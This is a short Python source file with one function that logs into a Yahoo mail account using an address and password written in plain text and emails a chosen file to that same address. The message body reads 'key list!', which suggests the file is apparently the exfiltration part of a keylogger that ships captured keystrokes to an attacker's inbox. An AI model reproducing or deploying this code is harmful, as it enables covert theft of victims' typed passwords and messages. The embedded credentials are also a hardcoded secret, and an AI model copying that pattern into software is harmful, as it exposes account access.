import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders


def sendMail(subject, path):
    email = "pybot16621@yahoo.com"
    pw = "rotten9112020"
    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = email
    msg['Subject'] = subject

    body = 'key list!'
    msg.attach(MIMEText(body, 'plain'))

    filename = path
    attachment = open(filename, 'rb')

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= "+filename)

    msg.attach(part)
    text = msg.as_string()
    server = smtplib.SMTP('smtp.mail.yahoo.com', 587)
    server.starttls()
    server.login(email, pw)

    server.sendmail(email, email, text)
    server.quit()
